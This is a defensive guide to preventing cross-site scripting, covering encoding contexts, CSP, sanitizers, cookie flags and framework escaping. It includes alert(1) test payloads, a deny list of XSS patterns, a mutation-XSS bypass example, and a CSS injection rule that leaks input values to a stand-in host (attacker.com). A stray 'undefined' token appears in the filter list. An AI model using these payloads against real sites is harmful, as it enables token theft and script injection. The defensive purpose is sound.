## XSS Prevention


### Context-Aware Output Encoding

Output encoding must match the specific context where user data appears. Each context has distinct metacharacters and encoding requirements.

#### HTML Context Encoding

For data inserted into HTML body content, encode `&`, `<`, `>`, `"`, `'`, and `/`. Use HTML entity encoding: `&` becomes `&amp;`, `<` becomes `&lt;`, `>` becomes `&gt;`, `"` becomes `&quot;`, `'` becomes `&#x27;`, `/` becomes `&#x2F;`.

#### HTML Attribute Context

When inserting data into HTML attributes, always use quoted attributes. Unquoted attributes are difficult to encode securely. Apply HTML entity encoding to all ASCII values less than 256 with the `&#xHH;` format, except alphanumerics. For safe attribute contexts like `class`, `id`, standard HTML encoding suffices. For event handlers or dangerous attributes, avoid user input entirely.

#### JavaScript Context Encoding

For data placed inside JavaScript strings, encode all non-alphanumeric characters using Unicode escaping `\xHH` for ASCII or `\uHHHH` for Unicode. Never insert untrusted data into dangerous contexts like executable JavaScript code outside strings, event handler attributes, or JavaScript URLs (`javascript:`).

#### CSS Context Encoding

Encode all non-alphanumeric characters to `\HH` hex format. Avoid placing untrusted data in CSS property values that accept `url()`, `expression()`, or `behavior()` functions, as these can execute JavaScript.

#### URL Context Encoding

Use URL encoding (percent-encoding) for data inserted into URL parameters. Validate that URLs begin with safe protocols (`http:`, `https:`). Block `javascript:`, `data:`, `vbscript:`, and other executable protocols. Apply standard URL encoding for query parameters and fragments.

### Content Security Policy (CSP)

CSP provides defense-in-depth by restricting resource loading and script execution through HTTP headers or meta tags.

#### Core Directives

`default-src` establishes the fallback policy for all resource types. `script-src` controls JavaScript execution sources. `style-src` governs CSS sources. `img-src`, `font-src`, `connect-src`, `media-src`, `object-src`, `frame-src` control their respective resource types.

#### Script Execution Control

`script-src 'none'` blocks all scripts. `script-src 'self'` allows only same-origin scripts. `script-src 'unsafe-inline'` permits inline scripts but weakens protection significantly. `script-src 'unsafe-eval'` allows `eval()` and related constructs, which should be avoided.

Nonces provide stronger inline script control: `script-src 'nonce-{random}'` allows only scripts with matching `nonce` attributes. Generate cryptographically random nonces per request. Hashes allow specific inline scripts: `script-src 'sha256-{hash}'` permits scripts matching the hash.

#### Strict CSP Patterns

Strict CSP eliminates `'unsafe-inline'` by using nonces or hashes exclusively. Combined with `'strict-dynamic'`, scripts loaded by trusted scripts are also trusted, while blocking parser-inserted scripts. Pattern: `script-src 'nonce-{random}' 'strict-dynamic'; object-src 'none'; base-uri 'none';`.

#### CSP Reporting

`report-uri` or `report-to` directives send violation reports to specified endpoints. `Content-Security-Policy-Report-Only` header enables testing without enforcement, reporting violations while allowing them to execute.

### Input Validation

Input validation reduces attack surface but does not replace output encoding.

#### Allowlist Validation

Define expected input patterns and reject anything outside them. For alphanumeric identifiers, accept only `[a-zA-Z0-9_-]`. For email addresses, use strict format validation. For URLs, parse and validate protocol, domain, and path components.

#### Length Restrictions

Enforce maximum input lengths appropriate to the field's purpose. Excessive length inputs may indicate attack payloads.

#### Type Validation

Validate that inputs match expected data types. Numeric fields should parse as numbers. Date fields should parse as valid dates. Enum fields should match predefined sets.

#### Dangerous Pattern Blocking

Block inputs containing `<script`, `javascript:`, `onerror=`, `onload=`, and other XSS indicators. [Inference: This provides additional defense but can be bypassed through encoding variations and should not be the primary defense mechanism.]

### Framework-Specific Protections

#### React

React escapes values embedded in JSX by default. `{userInput}` is automatically escaped. `dangerouslySetInnerHTML` bypasses escaping and should only receive sanitized HTML. Never pass user input directly to `dangerouslySetInnerHTML`.

#### Angular

Angular's template binding escapes values automatically. Property binding `[property]="value"` and interpolation `{{value}}` are safe. The `bypassSecurityTrustHtml`, `bypassSecurityTrustScript`, `bypassSecurityTrustUrl` methods disable sanitization and require extreme caution.

#### Vue

Vue templates escape interpolated values `{{value}}` automatically. The `v-html` directive renders raw HTML and requires sanitized input. Never bind user input directly to `v-html`.

#### Server-Side Frameworks

Template engines like Jinja2, EJS, Handlebars typically auto-escape by default. Verify the framework's escaping behavior and opt into auto-escaping if not default. Raw output filters (`|safe`, `{{{triple-braces}}}`, `undefined`) bypass escaping and require sanitized inputs.

### DOM-Based XSS Prevention

DOM-based XSS occurs when client-side JavaScript writes user-controllable data to dangerous DOM sinks.

#### Dangerous Sinks

`eval()`, `setTimeout(string)`, `setInterval(string)` execute strings as code. `Function()` constructor creates executable code from strings. `element.innerHTML`, `element.outerHTML` parse HTML and execute embedded scripts. `document.write()`, `document.writeln()` insert content that the parser evaluates. `element.insertAdjacentHTML()` parses HTML content. URL assignment to `location`, `location.href`, `location.replace()` can execute `javascript:` URLs. `script.src`, `script.text`, `script.textContent` create executable scripts.

#### Safe Alternatives

Use `textContent` or `innerText` instead of `innerHTML` for plain text. Use `setAttribute()` instead of direct property assignment for attributes. Use `createElement()` and `appendChild()` to construct DOM structures programmatically. Parse JSON with `JSON.parse()` instead of `eval()`. Use `setTimeout(function)` with a function reference instead of string code.

#### URL Handling

Validate URL protocols before assignment. Check that `url.startsWith('http:')` or `url.startsWith('https:')` before assigning to `location` or similar properties. Use URL parser (`new URL()`) to validate structure and extract components safely.

#### Sources of Tainted Data

`location.hash`, `location.search`, `document.referrer`, `document.URL`, `window.name` contain user-controllable data. `postMessage` event data comes from other windows. Any data retrieved from storage (`localStorage`, `sessionStorage`, `IndexedDB`) may have been tainted previously.

### HTTP Response Headers

#### X-Content-Type-Options

`X-Content-Type-Options: nosniff` blocks MIME-sniffing, preventing browsers from interpreting files as different types than declared. This prevents treating uploaded user files as HTML/JavaScript.

#### X-Frame-Options

`X-Frame-Options: DENY` blocks all framing. `X-Frame-Options: SAMEORIGIN` allows only same-origin framing. This mitigates some clickjacking-assisted XSS scenarios.

#### Referrer-Policy

Controls how much referrer information is sent. `Referrer-Policy: no-referrer` sends no referrer. `Referrer-Policy: strict-origin-when-cross-origin` sends only origin for cross-origin requests. Reduces leakage of sensitive data in URLs.

### Sanitization Libraries

When HTML input is required (rich text editors), sanitization libraries parse and clean HTML to remove dangerous elements and attributes.

#### DOMPurify

Client-side HTML sanitizer. Configurable allowlists for tags and attributes. Removes script-executing constructs while preserving safe HTML structure. Use before assigning to `innerHTML` or similar sinks.

#### Bleach (Python)

Server-side HTML sanitizer. Allowlist-based tag and attribute filtering. Integrates with Django and other frameworks.

#### OWASP Java HTML Sanitizer

Java library for HTML sanitization. Policy-based configuration for allowed elements and attributes.

#### Configuration Principles

Default to strict allowlists. Only permit tags necessary for functionality (`<p>`, `<strong>`, `<em>`, `<ul>`, `<li>`, `<a>`). Carefully control attributes, especially `href`, `src`, `style`. Block or sanitize `style` attributes to prevent CSS-based attacks. Validate URLs in `href` and `src` attributes.

[Inference: Sanitization libraries reduce risk but may contain bypasses. They work best as part of layered defense with CSP and output encoding.]

### Cookie Security

Cookies containing authentication tokens or session identifiers are high-value XSS targets.

#### HttpOnly Flag

`Set-Cookie: session=...; HttpOnly` makes cookies inaccessible to JavaScript via `document.cookie`. XSS cannot steal HttpOnly cookies directly, though attackers can still perform actions as the user.

#### Secure Flag

`Set-Cookie: session=...; Secure` transmits cookies only over HTTPS. Combined with HttpOnly: `Set-Cookie: session=...; HttpOnly; Secure`.

#### SameSite Attribute

`SameSite=Strict` sends cookies only for same-site requests. `SameSite=Lax` sends cookies for top-level navigation but not cross-site subrequests. `SameSite=None; Secure` allows cross-site cookie transmission (requires Secure flag). SameSite provides CSRF protection and limits cookie exposure to XSS on different origins.

### Subresource Integrity (SRI)

SRI verifies that resources loaded from CDNs haven't been tampered with.

#### Implementation

Add `integrity` attribute to `<script>` and `<link>` tags: `<script src="https://cdn.example.com/library.js" integrity="sha384-{hash}" crossorigin="anonymous"></script>`. The browser computes the hash of the downloaded file and compares it to the `integrity` value. Mismatches block execution.

#### Hash Generation

Generate SRI hashes using tools or command line: `openssl dgst -sha384 -binary file.js | openssl base64 -A`. Modern build tools can generate SRI hashes automatically.

#### Multiple Hashes

Include multiple hash algorithms for fallback: `integrity="sha384-{hash} sha512-{hash}"`.

[Inference: SRI protects against CDN compromise and network-level tampering but requires hash updates when libraries change.]

### Template Injection Prevention

Server-side template injection can lead to XSS when user input is embedded in template code.

#### Template Language Isolation

Never construct template strings by concatenating user input: `template = "Hello " + username` creates injection risk. Pass user data as template variables instead: `render(template, {"username": username})`.

#### Sandboxed Template Evaluation

Use templates with restricted evaluation contexts. Avoid templates that allow arbitrary code execution. Configure template engines to disable dangerous features like filesystem access or command execution.

### API Response Security

APIs returning JSON or other formats must prevent XSS when consumed by web applications.

#### Content-Type Headers

Set correct `Content-Type` for JSON responses: `Content-Type: application/json`. Never use `text/html` for JSON data. Browsers treat `text/html` as renderable, potentially executing embedded scripts.

#### X-Content-Type-Options

Include `X-Content-Type-Options: nosniff` to enforce declared Content-Type.

#### JSON Encoding

Encode JSON responses properly. Escape `<`, `>`, `&`, and Unicode line/paragraph separators (`\u2028`, `\u2029`). Some JSON libraries don't escape `<script>` patterns by default, which can cause issues if JSON is embedded in HTML.

#### JSONP Deprecation

JSONP allows script tag injection by design. Avoid JSONP entirely. Use CORS for cross-origin API access instead.

### Browser Feature Detection and Polyfills

Older browsers lack modern security features like CSP or SameSite cookies.

#### Feature Detection

Detect CSP support via `document.securityPolicy` or similar APIs. Detect SameSite cookie support by checking user agent or using test cookies.

#### Graceful Degradation

[Inference: When security features aren't available, compensatory controls become more critical.] Strengthen output encoding. Implement server-side validation more strictly. Add additional layers of authentication.

#### Polyfill Security

Verify integrity of polyfill sources. Use SRI for polyfill scripts. Prefer official polyfill services with security track records.

### Testing and Verification

#### Automated Scanning

Use tools like OWASP ZAP, Burp Suite, or dedicated XSS scanners to test applications. These tools inject common XSS payloads and monitor for successful execution.

#### Manual Testing

Test encoding in all contexts: HTML body, attributes, JavaScript strings, CSS, URLs. Test with varied payloads: `<script>alert(1)</script>`, `"><script>alert(1)</script>`, `';alert(1);//`, `javascript:alert(1)`, `<img src=x onerror=alert(1)>`, `<svg/onload=alert(1)>`.

#### CSP Testing

Use `Content-Security-Policy-Report-Only` header during development to identify violations without breaking functionality. Monitor CSP reports for legitimate functionality that needs allowlisting.

#### Penetration Testing

Engage security professionals to perform comprehensive XSS testing, including advanced techniques like mutation-based XSS, encoding bypasses, and framework-specific exploits.

### Advanced Attack Vectors

#### Mutation XSS (mXSS)

Browser HTML parsing quirks can transform sanitized input into executable code. Example: `<noscript><p title="</noscript><img src=x onerror=alert(1)>">` may bypass sanitizers when the browser parses it in different contexts.

#### Encoding-Based Bypasses

Attackers use HTML entity encoding, URL encoding, Unicode encoding, or mixed encoding to bypass filters. `<script>` becomes `&lt;script&gt;`, `%3Cscript%3E`, `\u003cscript\u003e`, or combinations.

#### Polyglot Payloads

Payloads valid in multiple contexts simultaneously. A polyglot might work as both valid JavaScript and HTML, bypassing context-specific filters.

#### DOM Clobbering

HTML elements with `id` or `name` attributes create global JavaScript variables. `<img id="userDetails">` creates `window.userDetails`. If code expects `userDetails` to be an object with properties, the img element can break logic or enable XSS.

#### CSS Injection

Though not traditional XSS, CSS can exfiltrate data via background images with attribute selectors: `input[value^="a"] { background: url(https://attacker.com/a); }`. This can steal CSRF tokens or other sensitive input values.

#### Prototype Pollution

Manipulating JavaScript object prototypes can alter application behavior. Combined with vulnerable sinks, this enables XSS. Example: polluting `Object.prototype.innerHTML` might affect DOM manipulation code.

### Defense in Depth Strategy

Layered security provides protection if any single control fails.

#### Primary Defense

Context-aware output encoding at the point where user data enters each context. This is the most critical control.

#### Secondary Defense

Input validation reduces attack surface and blocks obvious attack attempts. Provides early warning but cannot catch all encoding variations.

#### Tertiary Defense

CSP restricts damage if XSS occurs by limiting script execution and resource loading.

#### Additional Layers

HttpOnly cookies limit credential theft. SRI protects third-party resources. Security headers like X-Content-Type-Options add specific protections.

[Inference: Multiple defense layers compensate for potential bypasses or implementation errors in any single control. A successful attack typically requires defeating multiple controls.]

---

